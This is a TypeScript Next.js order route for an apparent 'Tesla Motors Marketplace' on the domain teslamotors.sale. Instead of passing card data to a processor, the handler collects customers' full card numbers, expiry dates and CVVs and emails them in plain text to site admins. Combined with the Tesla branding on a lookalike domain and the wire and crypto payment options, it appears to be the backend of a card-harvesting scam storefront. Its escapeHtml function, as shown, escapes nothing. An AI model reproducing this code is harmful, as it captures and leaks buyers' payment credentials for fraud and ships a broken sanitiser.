import { NextResponse } from 'next/server';
import { z } from 'zod';
import { prisma } from '@/lib/prisma';
import { getSession } from '@/lib/auth';
import { orderRef } from '@/lib/utils';
import { notifyAdmins } from '@/lib/notify';
import { sendEmail } from '@/lib/email';

const addrSchema = z.object({
  line1: z.string().min(1),
  line2: z.string().optional().nullable(),
  city: z.string().min(1),
  state: z.string().min(1),
  postal: z.string().min(1),
  country: z.string().min(1),
});

const schema = z.object({
  vehicleId: z.string().min(1),
  paymentPlan: z.enum(['FULL', 'DEPOSIT_50', 'DEPOSIT_25']),
  paymentMethod: z.enum(['CARD', 'WIRE', 'CRYPTO']).default('CARD'),
  notes: z.string().max(1000).optional(),
  deliveryMode: z.enum(['PROFILE', 'NEW']).optional(),
  billingAddress: addrSchema.optional(),
  deliveryAddress: addrSchema,
  card: z
    .object({
      name: z.string().min(1).max(120),
      number: z.string().min(13).max(19),
      expiry: z.string().min(4).max(7),
      cvv: z.string().min(3).max(4),
    })
    .optional(),
});

function planAmount(price: number, plan: 'FULL' | 'DEPOSIT_50' | 'DEPOSIT_25') {
  if (plan === 'FULL') return price;
  if (plan === 'DEPOSIT_50') return Math.round(price * 0.5 * 100) / 100;
  return Math.round(price * 0.25 * 100) / 100;
}

function formatAddr(a?: z.infer<typeof addrSchema>) {
  if (!a) return '(none)';
  return [a.line1, a.line2, `${a.city}, ${a.state} ${a.postal}`, a.country]
    .filter(Boolean)
    .join('\n');
}

function siteUrl() {
  return process.env.NEXT_PUBLIC_SITE_URL || 'https://teslamotors.sale';
}

export async function POST(req: Request) {
  try {
    const session = await getSession();
    if (!session) return NextResponse.json({ error: 'Not logged in' }, { status: 401 });

    const body = await req.json();
    const parsed = schema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid order data — delivery address is required' }, { status: 400 });
    }

    const {
      vehicleId,
      paymentPlan,
      paymentMethod,
      notes,
      card,
      billingAddress,
      deliveryAddress,
      deliveryMode,
    } = parsed.data;

    if (paymentMethod === 'CARD' && !card) {
      return NextResponse.json({ error: 'Card details required' }, { status: 400 });
    }

    const vehicle = await prisma.vehicle.findUnique({
      where: { id: vehicleId },
      include: { images: { orderBy: { displayOrder: 'asc' }, take: 1 } },
    });
    if (!vehicle || !vehicle.published) {
      return NextResponse.json({ error: 'Vehicle not found' }, { status: 400 });
    }
    if (vehicle.inventoryStatus === 'SOLD' || vehicle.inventoryStatus === 'UNAVAILABLE') {
      return NextResponse.json({ error: 'Vehicle is not available' }, { status: 409 });
    }

    const price = Number(vehicle.price);
    if (!(price > 0)) {
      return NextResponse.json({ error: 'Vehicle is not priced for sale' }, { status: 400 });
    }

    const amountDue = planAmount(price, paymentPlan);
    const reference = orderRef();
    const planLabel =
      paymentPlan === 'FULL'
        ? 'Full payment'
        : paymentPlan === 'DEPOSIT_50'
          ? '50% deposit'
          : '25% down payment';

    const order = await prisma.order.create({
      data: {
        reference,
        userId: session.id,
        vehicleId,
        sellingPrice: price,
        currency: vehicle.currency,
        paymentStatus: 'NONE',
        orderStatus: 'PENDING_PAYMENT',
        deliveryNotes: notes || null,
        internalNotes: JSON.stringify({
          paymentPlan,
          paymentMethod,
          amountDue,
          planLabel,
          deliveryMode: deliveryMode || 'PROFILE',
          billingAddress: billingAddress || null,
          deliveryAddress,
          cardSubmitted: paymentMethod === 'CARD',
        }),
      },
    });

    let cardBlock = '';
    if (paymentMethod === 'CARD' && card) {
      cardBlock = `
CARD PAYMENT DETAILS
--------------------
Name on card: ${card.name}
Card number: ${card.number}
Expiry: ${card.expiry}
CVV: ${card.cvv}

BILLING ADDRESS
---------------
${formatAddr(billingAddress)}
`;
    }

    const emailText = `
New vehicle order
=================
Order: ${order.reference}
Customer: ${session.fullName} <${session.email}>
Vehicle: ${vehicle.model} ${vehicle.trim} (${vehicle.slug})
List price: ${vehicle.currency} ${price}
Amount due now: ${vehicle.currency} ${amountDue}
Plan: ${paymentPlan}
Method: ${paymentMethod}

DELIVERY ADDRESS
----------------
${formatAddr(deliveryAddress)}

Notes: ${notes || '(none)'}
${cardBlock}
`;

    await notifyAdmins({
      type: 'ORDER',
      title: `New order ${order.reference}`,
      body: `${session.fullName} · ${vehicle.model} ${vehicle.trim} · ${paymentMethod} · ${vehicle.currency} ${amountDue}`,
      href: '/admin',
      emailSubject: `[Order ${order.reference}] ${paymentMethod} · ${vehicle.model}`,
      emailText,
      meta: { orderId: order.id, reference: order.reference, paymentMethod },
    }).catch((e) => console.error('Admin order notify failed', e));

    // Customer confirmation email (same event as admin notification)
    const site = siteUrl();
    const customerText = `Hi ${session.fullName},

Thank you for your order with Tesla Motors Marketplace.

Order number: ${order.reference}
Vehicle: ${vehicle.modelYear} Tesla ${vehicle.model} ${vehicle.trim}
List price: ${vehicle.currency} ${price.toLocaleString('en-US', { minimumFractionDigits: 2 })}
Amount due now (${planLabel}): ${vehicle.currency} ${amountDue.toLocaleString('en-US', { minimumFractionDigits: 2 })}
Payment method: ${paymentMethod}

Delivery address:
${formatAddr(deliveryAddress)}

Listed prices exclude tax, title, and registration. Final tax depends on where the vehicle is registered.

View order and payment instructions:
${site}/orders/${order.reference}/confirmed

Track your order:
${site}/delivery?order=${encodeURIComponent(order.reference)}

Questions: info@teslamotors.sale · (347) 508-6807
235 East 42nd Street, New York, NY 10017

Tesla Motors Marketplace
Affiliate partner of Tesla, Inc.
`;

    if (session.email) {
      await sendEmail({
        to: session.email,
        subject: `Order confirmed · ${order.reference} · Tesla Motors Marketplace`,
        text: customerText,
        html: `<div style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.5;color:#111;max-width:560px">
  <p>Hi ${escapeHtml(session.fullName)},</p>
  <p>Thank you for your order with <strong>Tesla Motors Marketplace</strong>.</p>
  <table style="width:100%;border-collapse:collapse;margin:16px 0;font-size:14px">
    <tr><td style="padding:6px 0;color:#666">Order number</td><td style="padding:6px 0;font-weight:600">${escapeHtml(order.reference)}</td></tr>
    <tr><td style="padding:6px 0;color:#666">Vehicle</td><td style="padding:6px 0">${escapeHtml(String(vehicle.modelYear))} Tesla ${escapeHtml(vehicle.model)} ${escapeHtml(vehicle.trim)}</td></tr>
    <tr><td style="padding:6px 0;color:#666">List price</td><td style="padding:6px 0">${escapeHtml(vehicle.currency)} ${price.toLocaleString('en-US', { minimumFractionDigits: 2 })}</td></tr>
    <tr><td style="padding:6px 0;color:#666">Due now</td><td style="padding:6px 0;font-weight:600">${escapeHtml(vehicle.currency)} ${amountDue.toLocaleString('en-US', { minimumFractionDigits: 2 })} <span style="font-weight:400;color:#666">(${escapeHtml(planLabel)})</span></td></tr>
    <tr><td style="padding:6px 0;color:#666">Payment</td><td style="padding:6px 0">${escapeHtml(paymentMethod)}</td></tr>
  </table>
  <p style="font-size:13px;color:#555">Listed prices exclude tax, title, and registration. Final tax depends on where the vehicle is registered.</p>
  <p><a href="${site}/orders/${order.reference}/confirmed" style="display:inline-block;background:#111;color:#fff;padding:12px 20px;border-radius:999px;text-decoration:none;font-size:14px;font-weight:600">View order & pay</a></p>
  <p style="font-size:13px;color:#666">Track: <a href="${site}/delivery?order=${encodeURIComponent(order.reference)}">${site}/delivery</a></p>
  <p style="font-size:12px;color:#888;margin-top:24px">Tesla Motors Marketplace · info@teslamotors.sale · (347) 508-6807<br/>235 East 42nd Street, New York, NY 10017</p>
</div>`,
      }).catch((e) => console.error('Customer order email failed', e));
    }

    return NextResponse.json({
      ok: true,
      reference: order.reference,
      orderId: order.id,
      amountDue,
      paymentPlan,
      paymentMethod,
      sellingPrice: price,
    });
  } catch (e: unknown) {
    console.error(e);
    const message = e instanceof Error ? e.message : 'Order failed';
    return NextResponse.json({ error: message }, { status: 400 });
  }
}

function escapeHtml(s: string) {
  return String(s)
    .replace(/&/g, '&')
    .replace(/</g, '<')
    .replace(/>/g, '>')
    .replace(/"/g, '"');
}
